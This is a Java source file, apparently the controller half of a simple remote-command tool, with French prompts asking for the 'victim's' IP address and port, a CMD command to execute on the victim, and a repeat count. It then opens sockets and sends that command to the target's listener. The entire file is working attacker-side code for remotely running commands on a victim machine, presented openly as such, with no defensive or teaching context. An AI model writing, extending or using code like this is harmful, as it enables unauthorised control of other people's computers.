import java.io.DataOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Scanner;

public class Send {

    public static void main(String[] args) {

        final String ipAddress = getUserInput("L'addresse IP de la victime:");
        final int ipPort = Integer.parseInt(getUserInput("Numéro de port de la victime:"));

        while (true) {

            final String command = getUserInput("Commande CMD à éxécuter sur la victime:");
            final int runCount = Integer.parseInt(getUserInput("Combien de fois éxécuter la commande:"));

            try {

                for (int i = 0; i < runCount; i++) {

                    System.out.println("Connecting to '" + ipAddress + "' on port '" + ipPort + "'");
                    final Socket socket = new Socket(ipAddress, ipPort);
                    System.out.println("\033[0;32m" + "SUCCESS! CONNECTED SUCCESSFULLY!" + "\033[0m");

                    final OutputStream outputStream = socket.getOutputStream();
                    final DataOutputStream dataOutputStream = new DataOutputStream(outputStream);

                    System.out.println("Sending command '" + command + "'...");

                    // write the message we want to send
                    dataOutputStream.writeUTF(command);
                    outputStream.flush();
                    dataOutputStream.flush();
                    dataOutputStream.close();
                    outputStream.close();

                    System.out.println("\033[0;32m" + "SUCCESS! SENT COMMAND SUCCESSFULLY!" + "\033[0m");
                    socket.close();
                }

            } catch (final IOException ignored) {}
        }
    }

    public static String getUserInput(final String question) {
        final Scanner scannerIntID = new Scanner(System.in);
        System.out.println(question);
        return (scannerIntID.nextLine());
    }
}
